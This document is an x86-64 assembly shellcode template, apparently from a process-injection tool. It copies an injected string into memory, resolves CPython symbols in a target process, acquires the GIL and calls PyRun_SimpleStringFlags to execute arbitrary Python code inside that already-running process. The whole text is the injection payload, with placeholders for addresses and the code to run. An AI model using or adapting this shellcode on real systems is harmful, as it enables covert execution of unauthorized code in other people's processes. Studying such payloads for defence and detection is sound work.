jmp execute_python_code_main

execute_python_code_main:

	# // BEGIN: call Py_Initialize()
	# [DISABLED_INLINE:stack_align-r8-pre.s:DISABLED_INLINE]
	# mov rbx, [SYMBOL_ADDRESS:Py_Initialize:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	# [DISABLED_INLINE:stack_align-r8-post.s:DISABLED_INLINE]
	# // END: call Py_Initialize()
	
	// copy the Python string to arbitrary read/write memory
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	lea rsi, python_code[rip]
	push rcx
	mov rcx, [VARIABLE:pythoncode.length:VARIABLE]
	add rcx, 2												# null terminator
	rep movsb
	pop rcx
	// END: copy the Python string to arbitrary read/write memory

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	[INLINE:stack_align-r8-pre.s:INLINE]
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	mov rbx, [SYMBOL_ADDRESS:PyGILState_Ensure:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	call rbx
	mov rbx, arbitrary_read_write_data_address[rip]
	mov [rbx], rax
	[INLINE:stack_align-r8-post.s:INLINE]
	// END: call PyGILState_Ensure()

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")	
	push rcx
	[INLINE:stack_align-r8-pre.s:INLINE]
	xor rsi, rsi
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	xor rcx, rcx
	mov rbx, [SYMBOL_ADDRESS:PyRun_SimpleStringFlags:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	call rbx
	[INLINE:stack_align-r8-post.s:INLINE]
	pop rcx
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	// BEGIN: call PyGILState_Release(handle)
	[INLINE:stack_align-r8-pre.s:INLINE]
	mov rbx, arbitrary_read_write_data_address[rip]
	mov rdi, [rbx]
	xor rsi, rsi
	mov rbx, [SYMBOL_ADDRESS:PyGILState_Release:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	call rbx
	[INLINE:stack_align-r8-post.s:INLINE]
	// END: call PyGILState_Release(handle)
	
	# // BEGIN: call Py_Finalize()
	# [DISABLED_INLINE:stack_align-r8-pre.s:DISABLED_INLINE]
	# mov rax, 0
	# mov rdi, rax
	# mov rbx, [SYMBOL_ADDRESS:Py_Finalize:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	# call rbx
	# [DISABLED_INLINE:stack_align-r8-post.s:DISABLED_INLINE]
	# // END: call Py_Finalize()

SHELLCODE_SECTION_DELIMITER

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"




